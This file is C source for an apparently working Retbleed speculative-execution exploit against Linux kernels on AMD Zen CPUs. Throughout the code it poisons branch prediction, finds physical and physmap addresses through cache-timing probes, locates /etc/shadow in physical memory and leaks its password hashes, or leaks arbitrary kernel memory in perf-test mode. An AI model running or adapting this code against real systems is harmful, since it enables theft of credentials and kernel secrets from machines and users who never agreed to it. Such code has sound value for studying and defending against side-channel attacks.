// SPDX-License-Identifier: GPL-3.0-only
/* #define UBUNTU_5_8_0_63_GENERIC */
/* #define DEBIAN_5_10_26_kwik */
#include <err.h>
	    typedef void (*evict_fn)();
#include <fcntl.h>
       #include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <linux/sysctl.h>
#include <sched.h>
#include <ctype.h>

#include "retbleed.h"
#include "retbleed_zen.h"

#define PATH_LEN 33
#define PROBE_SET 43
#define TRAIN_RET 0x4000000000UL
#define NO_HUGEPAGE

#define VERIFY_HUGEPAGE

static unsigned char *evict;

struct poison_info {
    u64 base; // _text start
    u64 bb_start;
    u64 target;
};

static int leak_range(struct mem_info *rb, struct poison_info *p, u64 secret_ptr, unsigned char prev_byte, u64 len, int leak_ascii);

//#define USE_ASCII_GADGET
#ifdef USE_ASCII_GADGET
#define NSPEC 0x80
#else
#define NSPEC 0x100
#endif
//#define NSPEC 0x80
__attribute__((aligned(0x1000))) static u64 results[NSPEC] = {};

#include <dirent.h>

static struct {
    int nblocks;
    // if block size is 128M, we fits 128 GiB of ram..
    int blocks[1024];
} phys_blocks;

// we get the available phys addresses of memory here
static void phys_blocks_init () {
#define MEM_BLOCK_SZ (128ul<<20)
#define PATH_MEM "/sys/devices/system/memory"
    int fd_mem = open(PATH_MEM, O_RDONLY|O_DIRECTORY);
    DIR *memdir = opendir(PATH_MEM);
    struct dirent *dent;
    int nblocks = 0;
    while ((dent = readdir(memdir)) != NULL) {
        int index;
        if (sscanf(dent->d_name, "memory%d", &index) == 0) continue;
        phys_blocks.blocks[nblocks++] = index;
    }
    phys_blocks.nblocks = nblocks;
    close(fd_mem);
}

void evict_init() {
#define SZ (1UL<<19)
    evict  = mmap((void *)0xf3337000000UL, SZ, PROT_RWX, MMAP_FLAGS, -1, 0);
    /* madvise(evict, SZ, MADV_HUGEPAGE); */
    memset(evict, 0xc3, SZ);
    {
        int i;
        for (i = 0; i < ((1<<18)>>12)-1; ++i) {
            evict[OFFS+i*0x1000 + 0] = 0xe9;
            evict[OFFS+i*0x1000 + 1] = 0xfb;
            evict[OFFS+i*0x1000 + 2] = 0x0f;
            evict[OFFS+i*0x1000 + 3] = 0x00;
            evict[OFFS+i*0x1000 + 4] = 0x00;

            evict[OFFS+i*0x1000 + 5+0] = 0xe9;
            evict[OFFS+i*0x1000 + 5+1] = 0xfb;
            evict[OFFS+i*0x1000 + 5+2] = 0x0f;
            evict[OFFS+i*0x1000 + 5+3] = 0x00;
            evict[OFFS+i*0x1000 + 5+4] = 0x00;
        }
        evict[OFFS+i*0x1000 + 0] = 0xc3;
        evict[OFFS+i*0x1000 + 5] = 0xc3;
    }
}
void evict_free() {
    munmap(evict, SZ);
}

void poison_info_init(struct poison_info *p, u64 kernel_text) {
    p->base = kernel_text;
    u64 src = (p->base + MMAP_RET_OFFSET) ^ PWN_PATTERN2;

    u64 src_page = src & ~0xfffUL;
    p->bb_start = src_page + (MMAP_LAST_TGT&0xfff);
    map_or_die((u8 *)src_page, 0x1000, PROT_RWX, MMAP_FLAGS & ~MAP_FIXED_NOREPLACE, -1, 0);
    memset((u8 *)p->bb_start, 0x90, MMAP_RET_OFFSET - MMAP_LAST_TGT);

    // ff e1  jmp *%rcx
    *(u8 *)(src-1) = 0xff;
    *(u8 *)src     = 0xe1;
}

static const u64 RB_VA = 0x1330000000UL;

u8 best_guess_ascii(u64 *results) {
    int best = 0;
    u8 guess = 0;
    for (int i = 0x20; i < 0x80; ++i) {
        if (results[i] > best) {
            best = results[i];
            guess = i;
        }
    }
    return guess;
}

u8 best_guess(u64 *results, int n) {
    int best = 0;
    u8 guess = 0;
    results[5] = 0;
    for (int i = 0; i < n; ++i) {
        if (results[i] > best) {
            best = results[i];
            guess = i;
        }
    }
    return guess;
}

void print_guess(u8 guess, int ascii) {
    if (ascii) {
	    if(isprint(guess)) {
		    printf("%c", guess);
	    } else {
		    printf("[%02x]", guess);
	    }
    } else {
        printf("%02x", guess);
    }
    fflush(stdout);
}


void do_train(struct poison_info *pi, u64 *train_path) {
    should_segfault = 1;
    int a;
    a = sigsetjmp(env, 1);
    if (a == 0) TRAINING_ASM;
    should_segfault = 0;
}

// this is specifically for leaking pa. unrolled i just _better_... no more
// questions, thanks
__attribute__((always_inline))
static inline int run_unrolled(u64 try_pa, u64* train_path, struct poison_info *pi, struct mem_info *rb) {
    sched_yield();
    int any_found = 0;
    //#pragma clang loop unroll_count(95)
    for (int x = 0 ; x < 10; ++x ) {
        u64 t0, dt;
        do_train(pi, NULL);
        asm volatile("clflushopt (%0)\n"::"r"(RB_VA + PROBE_SET*0x40));
        asm("mfence");
        ((evict_fn)(evict+OFFS))(); // i-cache evict seems to give a signal!
        CALL_PA_GADGET(try_pa + PROBE_SET*0x40);
        asm volatile("lfence");
        t0 = rdtsc();
        asm volatile("mov (%0), %%rax" :: "a"(RB_VA+PROBE_SET*0x40));
        dt = rdtscp() - t0;
        if (dt < 110) {
            any_found+=1;
        }
    }
    return any_found;
}

u64 do_find_phys (struct mem_info *rb, struct poison_info *p)
{
    p->target = p->base + PA_OFFSET;
    u64 train_path[PATH_LEN];
    if (mmap((void*)(TRAIN_RET&~0xfff), 0x10000, PROT_RWX, MMAP_FLAGS, -1, 0) == MAP_FAILED) {
        err(1, "train_ret %lx", TRAIN_RET);
    }
    for (int ii = 0; ii < PATH_LEN; ++ii) {
        train_path[ii] = TRAIN_RET;
        *(u8*)train_path[ii] = 0xc3;
    }
    u64 mem_tot = phys_blocks.nblocks * MEM_BLOCK_SZ;

    // Some work left to be done here..
    printf("[-] Sweep over %lu MiB of memory", mem_tot>>20);
    while (1) {
        printf(".");
        fflush(stdout);
        int confirms = 0;
#define CONFIRMS_WANTED 1
        for (int b = 0; b < phys_blocks.nblocks; ++b) {
            u64 block_pa = phys_blocks.blocks[b]*MEM_BLOCK_SZ;
            for (long try_pa = block_pa; try_pa < block_pa+MEM_BLOCK_SZ; try_pa += 1UL<<21) {
#ifdef USE_IBPB
                do_ibpb();
#endif
                confirms = 0;
                if (run_unrolled(try_pa, train_path, p, rb) > 0) {
                    // seems like there was signal here. try it again.
                    for (int i = 0; i < 10; ++i) {
                        confirms += run_unrolled(try_pa, train_path, p, rb);
                    }
                    if (confirms >= CONFIRMS_WANTED) {
                        rb->pa = try_pa;
                        printf("\n[*] reload buffer pa @ %lx\n", rb->pa);
                        return 0;
                    }
                    fflush(stdout);
                }
            }
        }
    }
    return -1;
}

int do_find_physmap (struct mem_info *rb, struct poison_info *p)
{
    p->target = p->base + PHYSMAP_OFFSET;

    sched_yield();
    while (1) {
        for (u64 try_phys_base = 0xffff880000000000UL; try_phys_base  < 0xffffd3fe00000000UL; try_phys_base += 1<<30){
            sched_yield();
            u64 results = 0;
            u64 try_kva = try_phys_base + rb->pa;
            for (int i = 0; i < 4; ++i) {
                do_train(p, NULL);
                asm volatile("clflushopt (%0)\n"::"r"(rb->va + PROBE_SET*0x40));
               ((evict_fn)(evict+OFFS))(); // i-cache evict seems to give a signal!
                CALL_PHYSMAP_GADGET(try_kva+PROBE_SET*0x40);
                u64 t0 = rdtsc();
                asm volatile("mov (%0), %%rax" :: "a"(rb->va+PROBE_SET*0x40));
                u64 dt = rdtscp() - t0;
                if (dt < 110) {
                    results++;
                }
            }
            if (results >= 2) {
                printf("[*] page_offset_base @ %lx\n", try_phys_base);
                printf("[*] reload buffer kva @ %lx\n", try_kva);
                rb->kva = try_kva;
                return 0;
            }
        }
    }
    printf("[!] I failed\n");
    return 0;
}

int leak_next(struct poison_info *p, struct mem_info *rb, u64 secret_ptr,
        unsigned char prev_byte, int leak_ascii) {
        memset(results, 0, sizeof(u64)*NSPEC);
        int nein = 0;
        sched_yield();
//#pragma clang loop unroll_count(95)
        for (int i = 0; i < 1000; i+=1) {
            if ((i%40) == 0 ) {
                sched_yield();
            }
#ifdef USE_IBPB
            do_ibpb();
#endif
#define RB_OFF 0x0
            flush_range(rb->va+RB_OFF, LEAK_STRIDE, NSPEC);
            for (int c = 0 ; c < 6; ++c) {
                do_train(p, NULL);
                ((evict_fn)(evict+OFFS))(); // i-cache evict seems to give a signal!
                CALL_LEAK_GADGET(secret_ptr, (rb->kva+RB_OFF), prev_byte);
            }
            reload_range(rb->va+RB_OFF, LEAK_STRIDE, NSPEC, results);
            u8 guess = leak_ascii ? best_guess_ascii(results) : best_guess(results, NSPEC);
#define THRESHOLD 1 // we usually don't have much noise
            if (results[guess] >= THRESHOLD)  {
                return guess;
            } else {
                nein++;
            }
        }
    return -1; // we failed
}

int leak_finger(struct poison_info *p, struct mem_info *rb, u64 secret_ptr,
        unsigned char prev_byte) {
    u64 results = 0;
    sched_yield();
    for (int c = 0 ; c < 22; ++c) {
        do_train(p, NULL);
        flush_range(rb->va, 0, 1);
        ((evict_fn)(evict+OFFS))(); // i-cache evict seems to give a signal!
        CALL_LEAK_GADGET(secret_ptr, rb->kva - ':' * LEAK_STRIDE, prev_byte);
        reload_range(rb->va, 0, 1, &results);
        if (results > 0) {
            return 0;
        }
    }
    return -1;
}


u64 do_find_shadow (struct mem_info *rb, struct poison_info *p) {
    u64 physmap_base = rb->kva - rb->pa;
    p->target = p->base + LEAK_OFFSET;

    u64 found_pa = 0;
    u64 try_shadow = 0;

    int rnd = rand();
    while (1) {
        for (int b = 0; b < phys_blocks.nblocks; ++b) {
            // Some work left to be done here..
            printf("\r[-] Find /etc/shadow... (block %03d/%03d)", (b+rnd)%phys_blocks.nblocks, phys_blocks.nblocks);
            fflush(stdout);
            u64 block_pa = phys_blocks.blocks[(b+rnd)%phys_blocks.nblocks]*MEM_BLOCK_SZ;

            for (long try_pa = block_pa; try_pa < block_pa+MEM_BLOCK_SZ; try_pa += 1UL<<12) {
                try_shadow = physmap_base + try_pa;
                if (try_pa % (1<<30) == 0) {
                    /* printf("current = 0x%lx\n", try_shadow); */
                }
                if (leak_finger(p, rb, try_shadow+0x76, '0') == 0) {
                    if (leak_next(p, rb, try_shadow+0x77, ':', 1) == '9') {
                        /* printf("yes 2 %lx\n", try_shadow); */
                        for(int xx = 0 ; xx<20; ++xx) {
                            if (leak_next(p, rb, try_shadow+4, ':', 1) == '$') {
                                /* printf("yes 3\n"); */
                                printf("\n[*] /etc/shadow @ %lx\n", try_shadow);
                                return try_shadow;
                            }
                        }
                    }
                }
            }
        }
    }

    return 1;
}


static int leak_range(struct mem_info *rb, struct poison_info *p, u64 secret_ptr, unsigned char prev_byte, u64 len, int leak_ascii)
{
    unsigned char everything[len+1];
    p->target = p->base + LEAK_OFFSET;
#define PRINT_ASCII 1
    everything[0] = prev_byte;
    int fails = 0;
    for (int i = 0 ; i < len ; ++i) {
        u64 cur_address = secret_ptr + i;
        int guess ;
//        #pragma clang loop unroll_count(95)
        for (int  x = 0; x < 20; ++x) {
            guess = leak_next(p, rb, cur_address, everything[i], leak_ascii);
            if (guess >= 0) {
                /* print_guess(guess, PRINT_ASCII); */
                /* fflush(stdout); */
                break;
            }
        }
        if (guess < 0) {
            if (fails < 10) {
                fails++;
                i--;
                if (i == -2) {
                    i = -1; // reset
                }
                continue;
            }
            for (int k = 0; k < i+1; ++k) {
                print_guess(everything[k], PRINT_ASCII);
            }
            printf("\n");
            printf("[!] too many failed reads! (addr=%lx; i=%d). Just restart!\n", cur_address, i);
            exit(10);
        }
        //print_guess(guess, PRINT_ASCII);
        everything[i+1] = guess;
        //prev_byte = guess;
    }

    for (int i = 0; i < len+1; ++i) {
	    print_guess(everything[i], PRINT_ASCII);
    }
    printf("\n");
    return 0;
}

static char *buf[0x2000];

int main(int argc, char *argv[])
{
    int perf_test = 0;
    unsigned long kernel_text = 0;
    unsigned long guess_pa = 0;
    struct mem_info rb;
    //setbuffer(stdout, buf,0x2000);
    if (argc < 2) {
        printf("Usage: %s <kernel_text> [perf_test]\n", argv[0]);
        printf("   Unless perf_test is given, start scanning for /etc/shadow.\n");
        printf("   Otherwise, leak 4096 bytes from a known kernel address.\n");
        return 1;
    }
    kernel_text = strtoul(argv[1], NULL, 16);
    perf_test = argc > 2;

    phys_blocks_init();
    prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, PR_SPEC_FORCE_DISABLE, 0, 0);
    srand(get_ms()^getpid());
    setup_segv_handler();
    rb.va = RB_VA;

#ifdef NO_HUGEPAGE
    map_or_die(rb.buf, 1UL<<21, PROT_RW, MMAP_FLAGS, -1, 0);
    madvise(rb.buf, 1UL<<21, MADV_HUGEPAGE);
#else
    map_or_die(rb.buf, 1UL<<21, PROT_RW, MMAP_FLAGS|MAP_HUGETLB, -1, 0);
#endif
    rb.buf[0x2202] = 12; // map the page.

#ifdef VERIFY_HUGEPAGE
    // only for root users.
    int fd_pagemap = open("/proc/self/pagemap", O_RDONLY);
    if (fd_pagemap < 0) {
        perror("fd_pagemap");
        exit(EXIT_FAILURE);
    }
    rb.pa = va_to_phys(fd_pagemap, rb.va);
    if (rb.pa != 0){
        printf("[-] Expecting to find %lx\n", rb.pa);
    }
#endif

    struct poison_info p;
    poison_info_init(&p, kernel_text);
    evict_init();
    do_find_phys(&rb, &p);
    do_find_physmap(&rb, &p);

    u64 nbytes;
    u64 m;
    char first_byte;
    if (perf_test) {
        m = kernel_text + LEAK_START;
        first_byte = FIRST_BYTE;
        nbytes = 4096;
    } else {
        // make sure we can leak successfully first
        leak_range(&rb, &p, kernel_text+LEAK_START, FIRST_BYTE, 1024, 0);

        m = do_find_shadow(&rb, &p);
        first_byte = 'r';
        nbytes = 128;
    }

    u64 t0 = get_ms();
    printf("[-] Read %lx: ", m);
    fflush(stdout);
    leak_range(&rb, &p, m, first_byte, nbytes, perf_test == 0);

    printf("[*] Leaked %ld bytes in %0.03f seconds\n", nbytes, (get_ms()-t0)/1000.0);
}
